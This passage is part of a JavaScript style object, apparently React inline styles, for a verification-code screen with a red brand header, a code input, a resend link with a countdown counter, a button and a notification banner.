    borderBottom: "1px solid #ececec",
    backgroundColor: "#fff",
  },
  brand: {
    color: "#e50914",
    fontSize: "18px",
    fontWeight: "700",
  },
  badge: {
    fontSize: "11px",
    color: "#4a4a4a",
    fontWeight: "600",
  },
  titleBox: {
    padding: "18px 12px",
    textAlign: "center",
    borderBottom: "1px solid #ececec",
    backgroundColor: "#fff",
  },
  title: {
    margin: 0,
    fontSize: "16px",
    color: "#333",
    fontWeight: "400",
  },
  body: {
    backgroundColor: "#f6f6f6",
    padding: "14px 14px 22px",
    borderBottom: "1px solid #ececec",
  },
  text: {
    fontSize: "11px",
    lineHeight: "1.6",
    color: "#333",
    margin: "0 0 14px 0",
  },
  infoRow: {
    display: "flex",
    marginBottom: "10px",
    fontSize: "12px",
  },
  label: {
    width: "110px",
    fontWeight: "700",
    color: "#333",
  },
  value: {
    color: "#333",
  },
  input: {
    width: "100%",
    maxWidth: "170px",
    height: "26px",
    borderRadius: "14px",
    border: "1px solid #d9d9d9",
    outline: "none",
    padding: "0 12px",
    backgroundColor: "#fff",
  },
  helper: {
    fontSize: "12px",
    color: "#333",
    marginTop: "28px",
    marginBottom: "12px",
  },
  resend: {
    fontSize: "12px",
  },
  resendLink: {
    color: "#2a76c6",
    cursor: "pointer",
  },
  resendLinkDisabled: {
    color: "#999",
    cursor: "not-allowed",
  },
  resendText: {
    color: "#666",
  },
  counter: {
    fontWeight: "700",
    color: "#111",
  },
  footerAction: {
    backgroundColor: "#fff",
    padding: "12px 14px",
    display: "flex",
    justifyContent: "flex-end",
    borderBottom: "1px solid #ececec",
  },
  button: {
    backgroundColor: "#e50914",
    color: "#fff",
    border: "none",
    padding: "8px 14px",
    fontSize: "12px",
    fontWeight: "700",
    borderRadius: "2px",
    cursor: "pointer",
  },
  bottomFooter: {
    backgroundColor: "#f3f3f3",
    textAlign: "center",
    padding: "14px 10px",
    fontSize: "11px",
    color: "#555",
  },
  dateTime: {
    fontSize: "10px",
    color: "#666",
    marginTop: "12px",
    textAlign: "center",
  },
  notification: {
    position: "fixed",
    top: "20px",
    right: "20px",
    padding: "12px 20px",
    borderRadius: "4px",
    color: "#fff",
    fontSize: "14px",
    zIndex: 1000,
  },
  loading: {
    textAlign: "center",
    padding: "10px",
    fontSize: "12px",
    color: "#666",
  },
};